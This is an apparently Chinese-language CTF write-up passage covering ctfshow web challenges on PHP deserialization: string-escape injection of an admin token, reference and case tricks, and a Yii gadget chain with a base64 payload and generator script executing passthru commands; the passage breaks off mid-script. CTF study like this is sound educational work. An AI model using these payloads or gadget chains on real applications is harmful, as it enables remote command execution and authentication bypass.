class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">from</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">msg</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$m</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">to</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$t</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">message</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fuck\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"loveU\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>得到 <code>O:7:\"message\":4:{s:4:\"from\";s:0:\"\";s:3:\"msg\";s:0:\"\";s:2:\"to\";s:0:\"\";s:5:\"token\";s:5:\"admin\";}</code></p>\n<p>复制 <code>\";s:5:\"token\";s:5:\"admin\";}</code> ，作为构造的结尾</p>\n<p>再编写代码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">message</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$from</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$msg</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$to</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$token</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">from</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">msg</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$m</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">to</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$t</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">message</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\";s:5:\"token\";s:5:\"admin\";}'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fuck\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"loveU\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>得到 <code>O:7:\"message\":4:{s:4:\"from\";s:0:\"\";s:3:\"msg\";s:0:\"\";s:2:\"to\";s:27:\"\";s:5:\"token\";s:5:\"admin\";}\";s:5:\"token\";s:5:\"admin\";}</code></p>\n<p>可以看到，构造的结尾共有 27 个字符，而 <code>fuck</code>  替换为 <code>loveU</code>  增加了一个字符，故共需要 27 个 <code>fuck</code></p>\n<p>编写如下代码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">message</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$from</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$msg</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$to</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$token</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">from</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">msg</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$m</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">to</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$t</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token variable\">$s</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_repeat</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fuck\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">27</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$s</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\";s:5:\"token\";s:5:\"admin\";}'</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"&lt;/br&gt;\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">message</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$s</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\";s:5:\"token\";s:5:\"admin\";}'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fuck\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"loveU\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>得到</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\";s:5:\"token\";s:5:\"admin\";}</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>O:7:\"message\":4:{s:4:\"from\";s:0:\"\";s:3:\"msg\";s:0:\"\";s:2:\"to\";s:135:\"loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU\";s:5:\"token\";s:5:\"admin\";}\";s:5:\"token\";s:5:\"admin\";}</pre></td></tr></tbody></table></figure><p>经检查， <code>to</code>  替换后 135 的末尾恰为最后一个 <code>loveU</code>  的结尾，故构造正确</p>\n<p>因此 payload: <code>?f=&amp;m=&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\";s:5:\"token\";s:5:\"admin\";}</code></p>\n<p>提交后，再访问 message.php，由于需要设置 cookie 的 msg 值，故设置，刷新网页，得到 flag</p>\n<h1 id=\"web-265\"><a class=\"anchor\" href=\"#web-265\">#</a> web 265</h1>\n<p>php 按地址传参</p>\n<p>变量引用</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfshowAdmin</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$token</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">token</span><span class=\"token operator\">=</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span> <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">token</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">token</span><span class=\"token operator\">===</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ctfshowAdmin</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><h1 id=\"web-266\"><a class=\"anchor\" href=\"#web-266\">#</a> web 266</h1>\n<p>PHP 特性：函数名和类名不区分大小写，变量名区分。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-12-04 23:52:24</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-12-05 00:17:08</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$cs</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'php://input'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfshow</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span><span class=\"token operator\">=</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span><span class=\"token operator\">=</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span><span class=\"token operator\">===</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">global</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token variable\">$ctfshowo</span><span class=\"token operator\">=</span>@<span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cs</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/ctfshow/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$cs</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Error <span class=\"token interpolation\"><span class=\"token variable\">$ctfshowo</span></span>\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>payload: <code>O:7:\"Ctfshow\":0:{}</code></p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/ctfshow/Web-vip/web266.jpg\" alt=\"\"></p>\n<h1 id=\"web-267\"><a class=\"anchor\" href=\"#web-267\">#</a> web 267</h1>\n<p>弱密码登入 admin/admin</p>\n<p>查看源码知 view-source</p>\n<p>在 page 下找到反序列换入口</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><p>这里为 <code>yii</code>  的反序列化链</p>\n<p>只有 <code>passthru</code>  有回显</p>\n<p>最后的 payload：</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>?r=/backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6ODoicGFzc3RocnUiO3M6MjoiaWQiO3M6OToidGFjIC9mbGFnIjt9aToxO3M6MzoicnVuIjt9fX19</pre></td></tr></tbody></table></figure><p>脚本</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>rest</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">CreateAction</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$checkAccess</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$id</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">checkAccess</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'passthru'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">id</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'tac /flag'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">Faker</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">use</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>rest<span class=\"token punctuation\">\\</span>CreateAction</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Generator</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">protected</span> <span class=\"token variable\">$formatters</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">formatters</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'close'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">CreateAction</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'run'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>db</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">use</span> <span class=\"token package\">Faker<span class=\"token punctuation\">\\</span>Generator</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td 